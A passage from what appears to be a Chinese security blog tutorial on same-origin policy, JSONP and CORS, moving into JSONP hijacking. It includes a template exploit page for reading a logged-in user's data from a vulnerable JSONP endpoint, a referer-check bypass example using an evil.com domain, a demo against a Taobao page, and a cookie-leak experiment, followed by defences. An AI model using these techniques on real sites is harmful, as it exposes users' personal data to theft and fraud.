<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json">a(<br>&#123;<br><span class="hljs-attr">"q"</span>: <span class="hljs-string">"西电"</span>,<br><span class="hljs-attr">"p"</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-attr">"s"</span>: [<br><span class="hljs-string">"西电教务处"</span>,<br><span class="hljs-string">"西电睿思"</span>,<br><span class="hljs-string">"西电迎新网"</span>,<br><span class="hljs-string">"西电图书馆"</span>,<br><span class="hljs-string">"西电研究生"</span>,<br><span class="hljs-string">"西电研究生系统"</span>,<br><span class="hljs-string">"西电研究生院"</span>,<br><span class="hljs-string">"西电信息化建设处"</span>,<br><span class="hljs-string">"西电电院"</span>,<br><span class="hljs-string">"西电就业信息网"</span><br>]<br>&#125;<br>)<br></code></pre></td></tr></table></figure>



<p>s 其实就是搜索结果的匹配项，而 cb 这个参数就是请求资源后的回调函数。</p>
<h3 id="3-2-JSONP-实现-ajax-的跨域请求"><a href="#3-2-JSONP-实现-ajax-的跨域请求" class="headerlink" title="3.2 JSONP 实现 ajax 的跨域请求"></a>3.2 JSONP 实现 ajax 的跨域请求</h3><p>我们知道，原生 Js 的 ajax 异步请求是有同源策略所限制的，但是有了 JSONP，我们便可以实现跨域请求。</p>
<p>接下来我们构造另一个域的生成 json 内容的 php 文件进行异步加载。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//127.0.0.1:8086/test.php</span><br><span class="hljs-meta">&lt;?php</span><br>$data = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">'age'</span>=&gt;<span class="hljs-number">20</span>,<br>    <span class="hljs-string">'name'</span>=&gt;<span class="hljs-string">'rt95'</span><br>);<br>$callback = $_GET[<span class="hljs-string">'callback'</span>];<br><br><span class="hljs-keyword">echo</span> $callback.<span class="hljs-string">"("</span>.json_encode($data).<span class="hljs-string">")"</span>;<br><span class="hljs-keyword">return</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>





<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs html">//127.0.0.1/frametest/test.html<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"jquery.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handler</span><span class="hljs-params">(data)</span> </span>&#123;</span><br><span class="javascript">            <span class="hljs-keyword">var</span> p = $(<span class="hljs-string">'p#content'</span>);</span><br><span class="actionscript">            p.html(<span class="hljs-string">'name : '</span> + data.name + <span class="hljs-string">'&lt;br&gt;'</span> + <span class="hljs-string">'age : '</span> + data.age);</span><br>        &#125;<br><span class="javascript">        $(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            $.ajax(&#123;</span><br><span class="actionscript">                type: <span class="hljs-string">'GET'</span>,</span><br><span class="actionscript">                url: <span class="hljs-string">'http://127.0.0.1:8086/test.php'</span>,</span><br><span class="actionscript">                dataType: <span class="hljs-string">'jsonp'</span>,</span><br><span class="actionscript">                jsonp: <span class="hljs-string">'callback'</span>, <span class="hljs-comment">// 请求 php 的参数名</span></span><br><span class="actionscript">                jsonpCallback: <span class="hljs-string">'handler'</span> <span class="hljs-comment">// 回调函数名 </span></span><br>            &#125;);<br>        &#125;);<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>运行文件！走你～你是不是发现了报错？长下面这样：</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/13.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">13.png</span></p>
<p>我们可以看到是被 CORS 这个规则给阻止了，那，什么是 CORS 呢？</p>
<h3 id="3-3-CORS-跨域资源共享"><a href="#3-3-CORS-跨域资源共享" class="headerlink" title="3.3 CORS (跨域资源共享)"></a>3.3 CORS (跨域资源共享)</h3><blockquote>
<p>如果浏览器支持HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。</p>
<p>CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。</p>
</blockquote>
<p>首先，我们需要了解：</p>
<p>Origin 表示的是本域，就是浏览器当前页面的域。我们看图说话：</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/14.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">14.png</span></p>
<p>假如我们的本域是 my.com ，待请求的外域为 sina.com，那么只要服务器端的响应头的 <strong>Access-Control-Allow-Origin</strong> 字段有我们的本域，亦或是通配符 * ，本次请求就可以成功。</p>
<p>像 POST ，GET 这样的简单请求只需验证这个字段即可，但是像 PUT，DELETE 等请求，在发送 ajax 之前，浏览器还会先发出一个 OPTION 请求，类似下面这样：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/path/to/resource</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: bar.com<br><span class="hljs-attribute">Origin</span>: http://my.com<br><span class="hljs-attribute">Access-Control-Request-Method</span>: POST<br></code></pre></td></tr></table></figure>

<p>服务器端会给出允许响应的请求类型：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">HTTP/1.1 <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Access-Control-Allow-Origin</span>: http://my.com<br><span class="hljs-attribute">Access-Control-Allow-Methods</span>: POST, GET, PUT, OPTIONS<br><span class="hljs-attribute">Access-Control-Max-Age</span>: 86400<br></code></pre></td></tr></table></figure>

<p>如果我们刚开始的请求是在字段 <strong>Access-Control-Allow-Methods</strong> 里面，那么浏览器就会继续发送 ajax 请求，否则会抛出错误，终止操作。</p>
<p>有了这些知识，我们就可以很轻松的解决上面的问题了。修改一下服务端的脚本，添加返回头的 <strong>Access-Control-Allow-Origin</strong> 字段。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">"Access-Control-Allow-Origin:*"</span>);<br>$data = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">"age"</span>=&gt;<span class="hljs-number">20</span>,<br>    <span class="hljs-string">"name"</span>=&gt;<span class="hljs-string">'rt95'</span><br>);<br>$callback = $_GET[<span class="hljs-string">'callback'</span>];<br><span class="hljs-keyword">echo</span> $callback.<span class="hljs-string">"("</span>.json_encode($data).<span class="hljs-string">")"</span>;<br><span class="hljs-keyword">return</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/15.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">15.png</span></p>
<p>这里有两个点需要注意下：</p>
<ul>
<li>dataType 的 T 是大写，一定要注意！！</li>
<li>请求界面一定要给返回页面中调用 callback 指定的函数，具体实现根据不同需要而定。</li>
</ul>
<h2 id="4-JSONP-的劫持"><a href="#4-JSONP-的劫持" class="headerlink" title="4@ JSONP 的劫持"></a>4@ JSONP 的劫持</h2><h3 id="4-1-漏洞原理"><a href="#4-1-漏洞原理" class="headerlink" title="4.1 漏洞原理"></a>4.1 漏洞原理</h3><p>介绍了这么多知识，接下来我们就来介绍如何具体利用这个可能的漏洞点。</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/16.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">16.png</span></p>
<p>其实上面这张图已经十分清晰的展示了 JSONP 的利用过程。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">用户注册网站 <span class="hljs-keyword">B </span>-----&gt;<br>用户访问网站 A -----&gt;<br>A 网站的恶意脚本功能是通过注册 Callback 函数来像 <span class="hljs-keyword">B </span>网站发起请求,获得用户在 <span class="hljs-keyword">B </span>上的信息 -----&gt;<br>[这步能够获取到 <span class="hljs-keyword">B </span>网站的凭证是利用了 CORS 这个跨域策略，访问获取配置是否允许传递 cookie，然后进行后面的处理逻辑]<br><span class="hljs-keyword">B </span>网站未做请求检测，返回用户数据 -----&gt;<br>数据上传至攻击者服务器<br></code></pre></td></tr></table></figure>



<h3 id="4-2-漏洞危害"><a href="#4-2-漏洞危害" class="headerlink" title="4.2 漏洞危害"></a>4.2 漏洞危害</h3><blockquote>
<p><strong>JSONP是一种敏感信息泄露的漏洞</strong>，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，<strong>网站中包含其他网站的JSONP漏洞利用代码</strong>，将链接通过邮件等形式推送给受害人，<strong>如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，</strong>这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p>
</blockquote>
<h3 id="4-3-漏洞利用"><a href="#4-3-漏洞利用" class="headerlink" title="4.3 漏洞利用"></a>4.3 漏洞利用</h3><p>要想利用 JSONP 漏洞，必须找到存在漏洞的接口，这个接口必须满足以下三个条件：</p>
<ul>
<li>泄露出了敏感的信息，如 email,username,严重甚至 token。</li>
<li>未检测 referer（可以绕过 HTML5 的 CORS 策略），或者验证方式不太严谨，正则写的不完善等等，譬如设置验证的 referer 为 <code>http://www.xxx.com</code>, 但是<code>http://www.xxx.com.evil.com</code> 依旧可以绕过限制。</li>
<li>未启用 token 验证。</li>
</ul>
<h4 id="寻找方法"><a href="#寻找方法" class="headerlink" title="寻找方法"></a>寻找方法</h4><p>我们可以使用如下方法来初步粗略的寻找可能存在漏洞的接口。</p>
<p>1、打开浏览器控制台的 Preseve log ,防止之前找到的结果被刷新的页面覆盖。</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/17.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">17.png</span></p>
<p>2、手动通过关键词筛选一些信息，搜索一些关键词，譬如 <code>callback</code>,<code>jsonp</code> 等，然后以此点进（确实慢，而且效率不高）。</p>
<p>3、这里以淘宝为例，我找到了一个没什么利用价值的页面，只是用来实现整个过程。</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/18.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">18.png</span></p>
<p>4、通过构造恶意代码，诱使登陆的用户访问，然后获得数据。（这里淘宝这个页面确实没做特殊的过滤和访问控制，可能是因为数据没什么利用价值）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"jquery.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> 【回调函数名】(<span class="hljs-params">data</span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-keyword">var</span> p = $(<span class="hljs-string">'p#content'</span>);</span><br><span class="actionscript">            p.html(<span class="hljs-string">'ip : '</span> + data.data.ip + <span class="hljs-string">'&lt;br&gt;'</span> + <span class="hljs-string">' region：'</span> + data.data.region + <span class="hljs-string">'&lt;br&gt;'</span> + <span class="hljs-string">' city: '</span> + data.data.city);</span><br>        &#125;<br><span class="javascript">        $(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            $.ajax(&#123;</span><br><span class="actionscript">                type: <span class="hljs-string">'GET'</span>,</span><br><span class="actionscript">                url: <span class="hljs-string">'接口名'</span>,</span><br><span class="actionscript">                dataType: <span class="hljs-string">'jsonp'</span>,</span><br><span class="actionscript">                jsonp: <span class="hljs-string">'callback'</span>, <span class="hljs-comment">// 请求 php 的参数名</span></span><br><span class="actionscript">                jsonpCallback: <span class="hljs-string">'回调函数名'</span> <span class="hljs-comment">// 回调函数名 </span></span><br>            &#125;);<br>        &#125;);<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/19.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">19.png</span></p>
<p>可以看到，数据已经跨域访问，并且输出到了页面上面，如果是敏感数据，危害确实是巨大的。</p>
<p>为了避免手动傻瓜寻找，我们可以编写爬虫脚本来自动化测试。</p>
<blockquote>
<p>（1）Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；</p>
<p>（2）Proxy：用于代理所有的请求，过滤出所有包含敏感信息的<a href="http://www.infosec-wiki.com/?tag=jsonp" target="_blank" rel="noopener">JSONP</a>请求，并记录下HTTP请求；</p>
<p>（3）验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</p>
</blockquote>
<p>引用的工具作者将工具放到了<a href="https://github.com/qiaofei32/jsonp_info_leak" target="_blank" rel="noopener">这</a>。</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/20.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">20.png</span></p>
<p>可以看到，速度和效率确实高出不少，但是还是需要一定程度的人工筛选。</p>
<h3 id="4-4-漏洞防御"><a href="#4-4-漏洞防御" class="headerlink" title="4.4 漏洞防御"></a>4.4 漏洞防御</h3><p>这个漏洞乍看起来利用起来很难。没错，随着网站开发者的安全意识的提升，接口过滤会愈来愈多，但是目前来看还是有很多存在缺陷的接口。想想，如果有个 xss 可利用，拿到 token 之类的数据， jsonp 的防御是否还是坚不可摧呢？</p>
<p>这里我们再补充一点，当服务端出现如下配置时，就算满足条件，服务端也会拒绝返回数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">header(<span class="hljs-string">"Access-Control-Allow-Origin: *"</span>);<br>header(<span class="hljs-string">"Access-Control-Allow-Credentials: true"</span>);<br></code></pre></td></tr></table></figure>


<p>其中：</p>
<blockquote>
<p>对应客户端的 <code>xhrFields.withCredentials: true</code> 参数，服务器端通过在响应 header 中设置 <code>Access-Control-Allow-Credentials = true</code> 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie</p>
</blockquote>
<h3 id="补充（跨域-ajax-带-cookie-的问题）"><a href="#补充（跨域-ajax-带-cookie-的问题）" class="headerlink" title="补充（跨域 ajax 带 cookie 的问题）"></a>补充（跨域 ajax 带 cookie 的问题）</h3><p>上面这段引用说到了在请求页面 ajax 必须带上参数 <code>withCredentials</code>,并设置其值为 <code>true。</code></p>
<p>服务端也必须设置头部 <code>Access-Control-Allow-Credentials = true</code>。</p>
<p>我们来做个实验：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html">// 请求页面 本地 1234 端口<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"jquery.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonp407</span><span class="hljs-params">(data)</span> </span>&#123;</span><br><span class="javascript">            <span class="hljs-keyword">var</span> p = $(<span class="hljs-string">'p#content'</span>);</span><br><span class="actionscript">		p.html(<span class="hljs-string">'name : '</span> + data.name + <span class="hljs-string">'&lt;br&gt;'</span> + <span class="hljs-string">' age：'</span> + data.age + <span class="hljs-string">'&lt;br&gt;'</span> + <span class="hljs-string">' cookie: '</span> + data.cookie);</span><br>        &#125;<br><span class="javascript">        $(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            $.ajax(&#123;</span><br><span class="actionscript">                type: <span class="hljs-string">'GET'</span>,</span><br><span class="actionscript">                url: <span class="hljs-string">'http://SEVER_IP/test.php'</span>,</span><br><span class="actionscript">                dataType: <span class="hljs-string">'jsonp'</span>,</span><br><span class="actionscript">                jsonp: <span class="hljs-string">'callback'</span>, <span class="hljs-comment">// 请求 php 的参数名</span></span><br><span class="actionscript">                jsonpCallback: <span class="hljs-string">'jsonp407'</span>, <span class="hljs-comment">// 回调函数名</span></span><br>                xhrFields: &#123;<br><span class="actionscript">                	 withCredentials: <span class="hljs-literal">true</span>   <span class="hljs-comment">// 设置带 cookie 的参数为true</span></span><br>                &#125;<br>            &#125;);<br>        &#125;);<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>然后在本地浏览器设置一个任意 cookie 值,这里我们本地浏览器在服务器页面下设置 cookie 值 localtest</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 跨域请求页面,远程服务器 80 端口</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">"Access-Control-Allow-Origin: *"</span>);<br>header(<span class="hljs-string">"Content-Type: application/json"</span>);<br>header(<span class="hljs-string">"Access-Control-Allow-Credentials: true"</span>);<br>$cookie = $_COOKIE[<span class="hljs-string">'localtest'</span>];<br>setcookie(<span class="hljs-string">'rt95'</span>,<span class="hljs-string">'123'</span>);<br>$cookie2 = $_COOKIE[<span class="hljs-string">'rt95'</span>];<br>$data = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">"age"</span>=&gt;<span class="hljs-number">20</span>,<br>    <span class="hljs-string">"cookie"</span>=&gt;$cookie,<br>    <span class="hljs-string">"name"</span>=&gt;<span class="hljs-string">'rt95'</span>,<br>    <span class="hljs-string">"cookie2"</span>=&gt;$cookie2<br>);<br>$callback = $_GET[<span class="hljs-string">'callback'</span>];<br><span class="hljs-keyword">echo</span> $callback.<span class="hljs-string">"("</span>.json_encode($data).<span class="hljs-string">")"</span>;<br><span class="hljs-keyword">return</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>访问本地页面：</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/21.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">21.png</span></p>
<p>防御方法：</p>
<ul>
<li>接口处限制 referer 字段，设置随机 token 等。</li>
<li>因为有直接利用 callback 函数进行的 xss攻击，我们还要严格控制编码，防止解析为 html ，要严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。</li>
<li>严格过滤 callback 函数名及 JSON 里数据的输出。</li>
<li>不要使用cookies来自定义JSONP响应。</li>
<li>在 JSONP 响应中不要加入用户的个人敏感数据。</li>
<li>严谨配置 Access-Control-Allow-Origin 选项。</li>
</ul>
<p>Reference:</p>
<p><code>&lt;白帽子讲web安全&gt;</code></p>
<p><code>https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400</code></p>
<p><code>http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</code></p>
<p><code>https://www.cnblogs.com/sdcs/p/8484905.html</code></p>
<p><code>https://blog.csdn.net/qq_38643434/article/details/81430528</code></p>
<p><code>https://www.cnblogs.com/xiaohuochai/p/6568039.html</code></p>
<p><code>https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</code></p>
<p><code>https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</code></p>
<p><code>https://www.freebuf.com/articles/web/70025.html</code></p>
<p><code>https://www.anquanke.com/post/id/97671</code></p>
<p><code>https://www.cnblogs.com/52php/p/5677775.html</code></p>
<p><code>https://www.infosec-wiki.com/?p=455211</code></p>
<p><code>https://blog.csdn.net/z69183787/article/details/78954325</code></p>
<p><code>https://www.w3cschool.cn/fetch_api/fetch_api-lx142x8t.html</code></p>

      </section>
      <section class="extra">
        
          <ul class="copyright">
  
    <li><strong>本文作者：</strong>rt95</li>
    <li><strong>本文链接：</strong><a href="http://59lx.github.io/2019/09/02/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5&JSONP%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/index.html" title="http:&#x2F;&#x2F;59lx.github.io&#x2F;2019&#x2F;09&#x2F;02&#x2F;%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5&amp;JSONP%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8&#x2F;index.html">http:&#x2F;&#x2F;59lx.github.io&#x2F;2019&#x2F;09&#x2F;02&#x2F;%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5&amp;JSONP%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8&#x2F;index.html</a></li>
    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
  
</ul>
        
        
          <section class="donate">
  <div id="qrcode-donate">
